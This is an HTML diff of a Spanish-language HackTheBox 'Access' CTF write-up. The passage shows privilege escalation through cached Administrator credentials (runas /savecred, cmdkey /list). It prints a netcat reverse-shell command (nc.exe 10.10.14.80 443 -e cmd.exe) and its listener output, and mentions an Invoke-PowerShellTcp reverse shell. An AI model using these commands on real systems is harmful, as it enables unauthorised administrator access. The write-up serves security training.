-</span></span><span style="display:flex;"><span>                runas.exe???<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span>??<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span>?*Yrunas.exeL-K?<span style="color:#66d9ef">?</span>E<span style="color:#66d9ef">?</span>C:\Windows\System32\runas.exe<span style="color:#75715e">#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?</span>
-</span></span><span style="display:flex;"><span>                                                                                     <span style="color:#66d9ef">?</span>wN?<span style="color:#960050;background-color:#1e0010">�</span>?]N<span style="color:#66d9ef">?</span>D.?<span style="color:#66d9ef">?</span>Q???`<span style="color:#66d9ef">?</span>Xaccess<span style="color:#66d9ef">?</span>_??<span style="color:#66d9ef">?</span><span style="color:#ae81ff">8</span>{E<span style="color:#66d9ef">?</span><span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>                               O<span style="color:#66d9ef">?</span>j)<span style="color:#66d9ef">?</span>H???
-</span></span><span style="display:flex;"><span>                                        )??[<span style="color:#66d9ef">?</span>_??<span style="color:#66d9ef">?</span><span style="color:#ae81ff">8</span>{E<span style="color:#66d9ef">?</span><span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>                                                      O<span style="color:#66d9ef">?</span>j)<span style="color:#66d9ef">?</span>H???
-</span></span><span style="display:flex;"><span>                                                               )??[?	?<span style="color:#66d9ef">?</span>1SPS?<span style="color:#66d9ef">?</span>XF<span style="color:#66d9ef">?</span>L8C???&amp;<span style="color:#66d9ef">?</span>m<span style="color:#66d9ef">?</span>e*S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">953262931</span>-<span style="color:#ae81ff">566350628</span>-<span style="color:#ae81ff">63446256</span>-<span style="color:#ae81ff">500</span>
-</span></span></code></pre></div><p>Y aquí podemos ver que se está ejecutando el binario runas.exe y utilizando la cuenta de administrador y la flag /savecred, por lo cual, las credenciales del Administrador deben de estar cacheadas.
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\security&gt; .\winPEASx64.exe 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\security&gt; <span style="color:#fff;font-weight:bold">Invoke-PowerShellTcp</span> <span style="color:#f00">:</span> Program <span style="color:#0ff;font-weight:bold">&#39;winPEASx64.exe&#39;</span> failed to execute<span style="color:#f00">:</span> This program is blocked by <span style="color:#fff;font-weight:bold">group </span>policy. <span style="color:#fff;font-weight:bold">For</span> more information, contact your system administrator
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>At line<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">1</span> char<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">17</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>+ .\winPEASx64.exe &lt;&lt;&lt;&lt;  .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>At line<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">128</span> char<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">21</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>+ <span style="color:#fff;font-weight:bold">Invoke-PowerShellTcp</span> &lt;&lt;&lt;&lt;  -Reverse -IPAddress <span style="color:#ff0;font-weight:bold">10.10</span>.14.80 -Port <span style="color:#ff0;font-weight:bold">443</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>    + CategoryInfo          <span style="color:#f00">:</span> NotSpecified<span style="color:#f00">:</span> (<span style="color:#f00">:</span>) [<span style="color:#fff;font-weight:bold">Write-Error</span>], WriteErrorException
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    + FullyQualifiedErrorId <span style="color:#f00">:</span> Microsoft.PowerShell.Commands.WriteErrorException,<span style="color:#fff;font-weight:bold">Invoke-PowerShellTcp</span></span></span></code></pre></div>
+<p>Enumerando un poco la máquina manualmente, vemos que en el escritorio del usuario público hay un acceso directo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\USers\Public\Desktop&gt; <span style="color:#fff;font-weight:bold">dir
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    Directory<span style="color:#f00">:</span> C:\USers\Public\Desktop
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>Mode                LastWriteTime     Length Name                                                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>----                -------------     ------ ----                                                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>-a---         <span style="color:#ff0;font-weight:bold">8</span>/<span style="color:#ff0;font-weight:bold">22</span>/<span style="color:#ff0;font-weight:bold">2018</span>  <span style="color:#ff0;font-weight:bold">10</span><span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">18</span> PM       <span style="color:#ff0;font-weight:bold">1870</span> ZKAccess3.5 Security System.lnk</span></span></code></pre></div>
+<p>Siempre es interesante echar un vistazo a los accesos directos ya que a veces la secuencia de ejecución contiene credenciales, o se pueden ver cosas que no deberían estas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\USers\Public\Desktop&gt; <span style="color:#fff;font-weight:bold">type </span><span style="color:#0ff;font-weight:bold">&#34;ZKAccess3.5 Security System.lnk&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>L<span style="color:#fff;font-weight:bold">?</span>F?@ ?<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">7</span>??<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">7</span>???<span style="color:#007f7f">#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?�M?:*wWindowsV1MV?System32???:?�MV?*?System32X2P?:?</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>                runas.exe???<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">1</span>??<span style="color:#f00">:</span><span style="color:#ff0;font-weight:bold">1</span>?*Yrunas.<span style="color:#fff;font-weight:bold">exeL-K</span>?<span style="color:#fff;font-weight:bold">?</span>E<span style="color:#fff;font-weight:bold">?</span>C:\Windows\System32\runas.exe<span style="color:#007f7f">#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>                                                                                     <span style="color:#fff;font-weight:bold">?</span>wN?<span style="color:#f00">�</span>?]N<span style="color:#fff;font-weight:bold">?</span>D.?<span style="color:#fff;font-weight:bold">?</span>Q???`<span style="color:#fff;font-weight:bold">?</span>Xaccess<span style="color:#fff;font-weight:bold">?</span>_??<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">8</span>{E<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>                               O<span style="color:#fff;font-weight:bold">?</span>j)<span style="color:#fff;font-weight:bold">?</span>H???
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>                                        )??[<span style="color:#fff;font-weight:bold">?</span>_??<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">8</span>{E<span style="color:#fff;font-weight:bold">?</span><span style="color:#ff0;font-weight:bold">3</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>                                                      O<span style="color:#fff;font-weight:bold">?</span>j)<span style="color:#fff;font-weight:bold">?</span>H???
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>                                                               )??[?	?<span style="color:#fff;font-weight:bold">?</span>1SPS?<span style="color:#fff;font-weight:bold">?</span>XF<span style="color:#fff;font-weight:bold">?</span>L8C???&amp;<span style="color:#fff;font-weight:bold">?</span>m<span style="color:#fff;font-weight:bold">?</span>e*S-<span style="color:#ff0;font-weight:bold">1</span>-<span style="color:#ff0;font-weight:bold">5</span>-<span style="color:#ff0;font-weight:bold">21</span>-<span style="color:#ff0;font-weight:bold">953262931</span>-<span style="color:#ff0;font-weight:bold">566350628</span>-<span style="color:#ff0;font-weight:bold">63446256</span>-<span style="color:#ff0;font-weight:bold">500</span></span></span></code></pre></div>
+<p>Y aquí podemos ver que se está ejecutando el binario runas.exe y utilizando la cuenta de administrador y la flag /savecred, por lo cual, las credenciales del Administrador deben de estar cacheadas.
 <code>..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\USers\Public\Desktop&gt; cmdkey /list
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Currently stored credentials<span style="color:#960050;background-color:#1e0010">:</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Target<span style="color:#960050;background-color:#1e0010">:</span> Domain<span style="color:#960050;background-color:#1e0010">:</span>interactive=ACCESS\Administrator
-</span></span><span style="display:flex;"><span>    Type<span style="color:#960050;background-color:#1e0010">:</span> Domain Password
-</span></span><span style="display:flex;"><span>    User<span style="color:#960050;background-color:#1e0010">:</span> ACCESS\Administrato
-</span></span></code></pre></div><p>Y sí, tienen pinta que están cacheadas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\USers\Public\Desktop&gt; cmdkey /list
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Currently stored credentials<span style="color:#f00">:</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    Target<span style="color:#f00">:</span> Domain<span style="color:#f00">:</span>interactive=ACCESS\Administrator
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>    Type<span style="color:#f00">:</span> Domain Password
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>    User<span style="color:#f00">:</span> ACCESS\Administrato</span></span></code></pre></div>
+<p>Y sí, tienen pinta que están cacheadas.</p>
 <p>Ahora, aprovechando el <code>netcat</code> que me había transmitido antes, como esto en principio lo va a ejecutar le usuario Administrador, no va a haber GPO que le restrinja la ejecución.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\USers\security&gt; runas /user<span style="color:#960050;background-color:#1e0010">:</span>ACCESS\Administrator /savecred <span style="color:#e6db74">&#34;cmd.exe /c C:\Users\security\nc.exe 10.10.14.80 443 -e cmd.exe&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
-</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
-</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.80<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.254.85<span style="color:#f92672">]</span> <span style="color:#ae81ff">49175</span>
-</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7600<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
-</span></span><span style="display:flex;"><span>whoami
-</span></span><span style="display:flex;"><span>access<span style="color:#ae81ff">\a</span>dministrator
-</span></span></code></pre></div><p>¡Y ya estaría!</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\USers\security&gt; runas /user<span style="color:#f00">:</span>ACCESS\Administrator /savecred <span style="color:#0ff;font-weight:bold">&#34;cmd.exe /c C:\Users\security\nc.exe 10.10.14.80 443 -e cmd.exe&#34;</span></span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.80] from (UNKNOWN) [10.129.254.85] <span style="color:#ff0;font-weight:bold">49175</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Microsoft Windows [Version 6.1.7600]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Copyright (c) <span style="color:#ff0;font-weight:bold">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>C:<span style="color:#0ff;font-weight:bold">\W</span>indows<span style="color:#0ff;font-weight:bold">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>access<span style="color:#0ff;font-weight:bold">\a</span>dministrator</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
 <p>Happy Hacking! 🚀</p>
 
-    </div>
+  </content>
+  <p>
+    
+      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
+    
+      <a href="/tags/access/">#Access</a>&nbsp;&nbsp;
+    
+      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
+    
+      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
+    
+      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
+    
+      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
+    
+      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
+    
+      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
+    
+      <a href="/tags/windows/">#Windows</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ftp-enumeration-using-binary-mode/">#FTP Enumeration (Using Binary Mode)</a>&nbsp;&nbsp;
+    
+      <a href="/tags/pst-files-pst-utils/">#PST Files (Pst-Utils)</a>&nbsp;&nbsp;
+    
+      <a href="/tags/mdb-files-mdbtools/">#MDB Files (Mdbtools)</a>&nbsp;&nbsp;
+    
+      <a href="/tags/bypassing-anti-executable-gpo/">#Bypassing Anti-Executable GPO</a>&nbsp;&nbsp;
+    
+      <a href="/tags/abusing-cached-credentials/">#Abusing Cached Credentials</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+  <span>© 2024 pointedsec</span>
+
+
+
+    </footer>
 
     
-
-            </div>
-        </div><footer class="text-center pb-1">
-    <small class="text-muted">
-        
-            &copy; 2024, Andrés Del Cerro
-        
-        <br>
-        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
-        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
-    </small>
-</footer>
 </body>
 </html>
